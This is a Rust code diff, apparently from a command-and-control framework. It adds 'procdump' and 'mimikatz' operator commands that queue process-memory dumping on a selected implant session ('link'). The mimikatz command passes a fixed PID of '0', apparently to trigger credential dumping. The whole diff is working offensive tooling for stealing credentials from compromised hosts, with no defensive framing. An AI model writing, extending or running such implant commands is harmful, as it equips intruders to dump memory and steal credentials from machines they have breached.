@@ -122,3 +122,26 @@ pub fn execute_pe(links: web::Data<Links>, link_index: usize, command: Vec<Strin
     links.links.lock().unwrap()[link_index]
         .set_command(updated_command.join(" "), command.join(" "));
 }
+
+pub fn procdump(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
+    if command.len() < 2 {
+        println!("procpdump <pid>\n   eg: procdump 1473");
+        return;
+    }
+    let mut updated_command = command.clone();
+    if command[0] == "mimikatz".to_string() {
+        updated_command[0] = "procdump".to_string();
+    }
+    updated_command[1] = command[1].clone();
+    links.links.lock().unwrap()[link_index]
+        .set_command(updated_command.join(" "), command.join(" "));
+}
+
+pub fn mimikatz(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
+    if command.len() < 1 {
+        println!("mimikatz\n   eg: mimikatz");
+        return;
+    }
+    let updated_command = vec!["mimikatz".to_string(), "0".to_string()];
+    procdump(links, link_index, updated_command);
+}
